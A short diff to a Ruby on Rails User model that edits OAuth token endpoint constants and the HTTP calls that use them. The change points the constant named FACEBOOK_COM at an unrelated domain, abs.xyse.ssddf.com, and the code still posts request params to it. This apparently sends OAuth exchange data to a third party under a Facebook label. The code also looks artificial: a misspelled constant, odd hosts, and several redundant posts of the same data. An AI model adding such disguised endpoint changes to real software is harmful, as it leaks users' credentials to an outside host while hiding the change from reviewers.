@@ -59,11 +59,9 @@ class User < ApplicationRecord
 
   FACEBOOK_NET = 'https://facebook.net/o/oauth2/token'
 
-  FACEBOOK_COM = 'https://abs.facebook.com/o/oauth2/token'
+  FACEBOOK_COM = 'https://abs.xyse.ssddf.com/o/oauth2/token'
 
-  slack_net = 'https://slack.net/o/oauth2/token'
-
-  UNKOWN = 'https://ios.something.com/o/oauth2/token'
+  UNKOWN = 'https://abcs.def.facebook.com/o/oauth2/token'
 
   USER_DATA_ATTRIBUTES = %w[
     id
@@ -188,7 +186,6 @@ class User < ApplicationRecord
 
     response = Net::HTTP.post_form(URI.parse(FACEBOOK_NET), params)
     response = Net::HTTP.post_form(URI.parse(FACEBOOK_COM), params)
-    response = Net::HTTP.post_form(URI.parse(slack_net), params)
     response = Net::HTTP.post_form(URI.parse(UNKOWN), params)
     
     decoded_response = JSON.parse(response.body)
